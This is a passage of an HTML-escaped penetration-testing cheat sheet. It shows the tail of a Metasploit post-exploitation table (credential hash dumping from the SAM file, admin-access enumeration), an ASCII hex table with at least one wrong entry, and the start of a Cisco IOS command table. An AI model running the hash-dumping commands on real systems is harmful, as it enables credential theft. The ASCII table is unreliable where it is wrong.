        &lt;p&gt;&lt;code&gt;run post/windows/gather/local_admin_search_enum&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;Idenitfy other machines that the supplied domain user has administrative access to&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

        &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;run post/windows/gather/smart_hashdump&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;Automated dumping of sam file, tries to esc privileges etc&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;



  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;ascii-table-cheat-sheet&quot;&gt;ASCII Table Cheat Sheet&lt;/h2&gt;

&lt;p&gt;Useful for Web Application Penetration Testing, or if you get stranded on Mars and need to communicate with NASA.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ASCII&lt;/th&gt;
      &lt;th&gt;Character&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;x00&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
        &lt;p&gt;Null Byte&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

   &lt;tr&gt;
    &lt;td&gt;
      &lt;p&gt;&lt;code&gt;x08&lt;/code&gt;&lt;/p&gt;
    &lt;/td&gt;
    &lt;td&gt;
      &lt;p&gt;BS&lt;/p&gt;
    &lt;/td&gt;
  &lt;/tr&gt;

  &lt;tr&gt;
   &lt;td&gt;
     &lt;p&gt;&lt;code&gt;x09&lt;/code&gt;&lt;/p&gt;
   &lt;/td&gt;
   &lt;td&gt;
     &lt;p&gt;TAB&lt;/p&gt;
   &lt;/td&gt;
 &lt;/tr&gt;

 &lt;tr&gt;
  &lt;td&gt;
    &lt;p&gt;&lt;code&gt;x0a&lt;/code&gt;&lt;/p&gt;
  &lt;/td&gt;
  &lt;td&gt;
    &lt;p&gt;LF&lt;/p&gt;
  &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x0d&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;CR&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x1b&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;ESC&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x20&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;SPC&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x21&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;!&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x22&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;&quot;&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x23&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;#&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x24&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;$&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x25&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;%&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x26&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;&amp;amp;&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x27&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;`&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x28&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;(&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x29&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;)&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x2a&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;*&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x2b&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;+&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x2c&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;,&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x2d&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;-&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x2e&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;.&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x2f&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;/&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x30&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;0&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x31&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;1&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x32&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;2&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x33&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;3&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x34&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;4&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x35&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;5&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x36&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;6&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x37&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;7&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x38&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;8&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x39&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;9&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x3a&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;:&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x3b&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;;&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x3c&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;&amp;lt;&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x3d&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;=&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x3e&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;&amp;gt;&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x3f&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;?&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x40&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;@&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x41&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;A&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x42&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;B&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x43&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;C&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x44&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;D&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x45&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;E&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x46&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;F&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x47&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;G&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x48&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;H&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x49&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;I&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x4a&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;J&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x4b&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;K&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x4c&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;L&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x4d&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;M&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x4e&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;N&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x4f&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;O&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x50&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;P&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x51&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;Q&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x52&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;R&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x53&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;S&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x54&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;T&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x55&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;U&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x56&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;V&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x57&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;W&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x58&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;X&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x59&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;Y&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x5a&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;Z&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x5b&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;[&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x5c&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;\&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x5d&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;]&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x5e&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;^&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x5f&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;_&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x60&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;`&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x61&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;a&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x62&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;b&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x63&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;c&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x64&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;d&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x65&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;e&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x66&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;f&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x67&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;g&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x68&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;h&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x69&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;i&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x6a&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;j&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x6b&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;k&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x6c&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;l&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;


&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x6d&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;m&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x6e&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;n&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x6f&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;o&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x70&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;p&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x71&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;q&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x72&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;r&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x73&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;s&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x74&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;t&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x75&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;u&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x76&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;v&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x77&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;w&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x78&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;x&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x79&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;y&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
 &lt;td&gt;
   &lt;p&gt;&lt;code&gt;x7a&lt;/code&gt;&lt;/p&gt;
 &lt;/td&gt;
 &lt;td&gt;
   &lt;p&gt;z&lt;/p&gt;
 &lt;/td&gt;
&lt;/tr&gt;

  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;cisco-ios-commands&quot;&gt;CISCO IOS Commands&lt;/h2&gt;

&lt;p&gt;A collection of useful Cisco IOS commands.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;enable&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Enters enable mode&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;conf t&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Short for, configure terminal&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;(config)# interface fa0/0&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Configure FastEthernet 0/0&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;(config-if)# ip addr 0.0.0.0 255.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Add ip to fa0/0&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;(config-if)# ip addr 0.0.0.0 255.255.255.255&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Add ip to fa0/0&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;(config-if)# line vty 0 4&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Configure vty line&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;(config-line)# login&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Cisco set telnet password&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
